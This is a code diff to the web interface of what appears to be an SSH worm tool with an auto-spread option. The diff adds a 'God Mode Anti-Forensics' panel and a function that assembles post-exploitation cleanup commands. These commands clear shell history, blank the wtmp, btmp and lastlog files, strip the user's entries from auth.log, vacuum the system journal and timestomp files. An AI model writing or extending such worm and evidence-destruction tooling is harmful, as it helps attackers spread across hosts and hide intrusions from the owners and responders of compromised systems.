@@ -248,6 +248,44 @@
                                     <i class="fas fa-virus me-2 text-danger"></i>Auto-Spread to Discovered Hosts
                                 </label>
                             </div>
+                            
+                            <!-- God Mode Anti-Forensics -->
+                            <div class="mt-3 p-3 rounded" style="background: linear-gradient(135deg, rgba(168, 85, 247, 0.1), rgba(239, 68, 68, 0.1)); border: 1px solid rgba(168, 85, 247, 0.3);">
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="godModeEnabled" style="accent-color: #a855f7;">
+                                    <label class="form-check-label text-white" for="godModeEnabled">
+                                        <i class="fas fa-skull me-2" style="color: #a855f7;"></i>💀 God Mode Anti-Forensics
+                                    </label>
+                                </div>
+                                <div id="godModeOptions" class="mt-2" style="display: none;">
+                                    <div class="row g-2">
+                                        <div class="col-6">
+                                            <div class="form-check form-check-sm">
+                                                <input class="form-check-input" type="checkbox" id="gmTimestomp" checked>
+                                                <label class="form-check-label text-white small" for="gmTimestomp">🕐 Time Stomp</label>
+                                            </div>
+                                        </div>
+                                        <div class="col-6">
+                                            <div class="form-check form-check-sm">
+                                                <input class="form-check-input" type="checkbox" id="gmHistoryClean" checked>
+                                                <label class="form-check-label text-white small" for="gmHistoryClean">📜 History Clean</label>
+                                            </div>
+                                        </div>
+                                        <div class="col-6">
+                                            <div class="form-check form-check-sm">
+                                                <input class="form-check-input" type="checkbox" id="gmLogClean" checked>
+                                                <label class="form-check-label text-white small" for="gmLogClean">📋 Log Clean</label>
+                                            </div>
+                                        </div>
+                                        <div class="col-6">
+                                            <div class="form-check form-check-sm">
+                                                <input class="form-check-input" type="checkbox" id="gmSshLogs">
+                                                <label class="form-check-label text-white small" for="gmSshLogs">🔐 SSH Logs</label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
                         </div>
                         <div class="col-md-6">
                             <label class="form-label text-warning">
@@ -578,6 +616,48 @@ function downloadOutput() {
     a.href = url;
     a.download = 'ssh_worm_output.txt';
     a.click();
+}
+
+// God Mode Anti-Forensics
+document.getElementById('godModeEnabled')?.addEventListener('change', function() {
+    document.getElementById('godModeOptions').style.display = this.checked ? 'block' : 'none';
+});
+
+function getGodModeConfig() {
+    if (!document.getElementById('godModeEnabled')?.checked) return null;
+    return {
+        timestomp: document.getElementById('gmTimestomp')?.checked,
+        history_clean: document.getElementById('gmHistoryClean')?.checked,
+        log_clean: document.getElementById('gmLogClean')?.checked,
+        ssh_logs: document.getElementById('gmSshLogs')?.checked
+    };
+}
+
+async function executeGodModeCleanup() {
+    const config = getGodModeConfig();
+    if (!config) return;
+    
+    // Add cleanup commands to post-exploit
+    let cleanupCmds = [];
+    if (config.history_clean) {
+        cleanupCmds.push('unset HISTFILE');
+        cleanupCmds.push('history -c');
+        cleanupCmds.push('rm -f ~/.bash_history ~/.zsh_history');
+    }
+    if (config.log_clean) {
+        cleanupCmds.push('echo "" > /var/log/wtmp 2>/dev/null');
+        cleanupCmds.push('echo "" > /var/log/btmp 2>/dev/null');
+        cleanupCmds.push('echo "" > /var/log/lastlog 2>/dev/null');
+    }
+    if (config.ssh_logs) {
+        cleanupCmds.push('sed -i "/$(whoami)/d" /var/log/auth.log 2>/dev/null');
+        cleanupCmds.push('journalctl --vacuum-time=1s 2>/dev/null');
+    }
+    if (config.timestomp) {
+        cleanupCmds.push('touch -r /bin/ls ~/.ssh/known_hosts 2>/dev/null');
+    }
+    
+    return cleanupCmds.join(' && ');
 }
 
 // Initialize
